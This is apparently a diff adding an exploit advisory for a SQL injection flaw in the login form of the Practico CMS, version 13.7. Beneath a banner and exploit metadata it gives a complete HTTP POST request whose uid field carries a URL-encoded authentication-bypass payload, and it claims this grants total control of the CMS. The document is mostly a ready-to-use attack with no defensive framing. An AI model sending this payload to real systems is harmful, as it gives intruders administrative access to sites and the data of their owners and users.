@@ -1,0 +1,36 @@
+############################################################
+#  ______     __       __   _____    ______   __      __  ____  __         __   _____
+# |____     |   |     |     |    | |_     __|  |      ___|  |    |    |    | |         | |     \      |    |  |__   __|
+#          /   /     |     |     |    |      |  |         \    \         |    |    |    | |     __| |      \     |    |       |  |
+#        /    /      |     |__|    |      |  |            \   \       |    |__|    | |    |__  |       \    |    |       |  |
+#      /    /        |      __     |      |  |              \   \     |    __      | |     __| |         \  |    |       |  |
+#    /     /___  |     |    |     | __|  |__    ___\   \   |    |    |     | |    |__  |    | \    \|    |  __|  |__
+#  |______|  |__|    |__| |______| |_____ | |__|    |__| |____| |__|   \___ | |_____ |
+# 
+############################################################
+
+# Exploit Title: Practico Login SQL Injection
+# Date: 2013 - 08 - 12
+# Exploit Author: shiZheni
+# Software Link: http://www.codigoabierto.org/
+# Software Download Link : http://sourceforge.net/projects/practico/files/
+# Version: 13.7 
+# Afected Version : 13.7 < and Last 
+# Tested on: Window 7 and PHP 5.3.15
+
+==================================================
+#1 [ SQLi]  Login - Admin ( Total Access )
+
+
+POST /demo/practico/ HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 73
+Referer: http://localhost/demo/practico/
+Host: localhost
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+
+accion=Iniciar_login&uid=admin%27+AND+1%3D1%23&clave=password&captcha=mrr6
+
+This vulnerability give you total access and control in the CMS.
+
